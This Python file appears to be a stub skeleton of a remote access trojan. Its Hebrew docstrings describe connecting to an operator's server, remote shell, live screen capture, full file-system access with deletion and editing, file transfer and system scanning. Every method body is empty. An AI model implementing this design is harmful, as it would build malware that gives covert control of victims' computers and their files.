from Api.scanner_api import set_sig
from Api.tcp_connect import *
from Api.mode_api import *
from threading import Thread


class NOODx4_5(TcpConnect):
	
    def __init__(self):
		
		pass
		
    def TCP_RUN(self):
		"""
  		תהליך החיבור לשרת הראשי והורדת נתוני שרת המפעיל
		אם הכתובת שהתקבלה תקינה ונוצר חיבור איתה, הסוס ישלח נתונים שלו 
  		למפעיל, וייוצר חיבור ברמת הפרוטוקול (הצפנה ומבנה החבילות)
  		"""
		pass
		
    def TCP_COMMUNICATION(self):
		"""
  		אחרי שתהליך החיבור עם המפעיל הסתיים, הסוס ימתין לחבילות מידע שמתפעלות אותו
		
  		"""
		pass
		
    def mode_ping(self):
		"""
  		כל פרק זמן צד המפעיל ישלח לסוס חבילה לבדיקת תקינות החיבור
  		"""
		pass
		
    def mode_shell(self, _info):
		"""
  		הסוס יפעיל תהליך חדש בחיבור חדש, שישמש ליצירת פקודות על גבי המערכת
  		"""
		pass
		
    def mode_screen(self, _info):
		"""
  		הסוס יפעיל חיבור חדש שישמש לשידור המסך בזמן אמת
  		"""
		pass
		
    def mode_explorer(self, _info):
		"""
  		הסוס יפעיל תהליך עם חיבור חדש לגישה לכל קבצי המערכת עם יכולות נלוות כמו הורדה מחיקה עריכה
		ועוד
  		"""
		pass
		
    def mode_streamer(self, _info: dict):
		"""
  		הסוס יפעיל תהליך חדש עם חיבור חדש לצורך הורדה או העלאת קובץ או תיקייה
  		"""
		pass
		
    def mode_scanner(self, _info:dict):
		"""
  		הסוס יפעיל תהליך רועש לסריקה, לכן הוא מסוכן מאוד, המפעיל יריץ סריקה ספציפית
		מתוך 5 הסריקות האפשריות שבו הסוס יחזיר את המידע שמערכת ההפעלה החזירה
  		מוד זה נתמך רק בסוס בשפת פייתון, 
  		"""
		pass


	
		
    def ForceClean(self):
		"""
  		ניקוי שכולל סגירת חיבורים 
  		"""
		pass
        
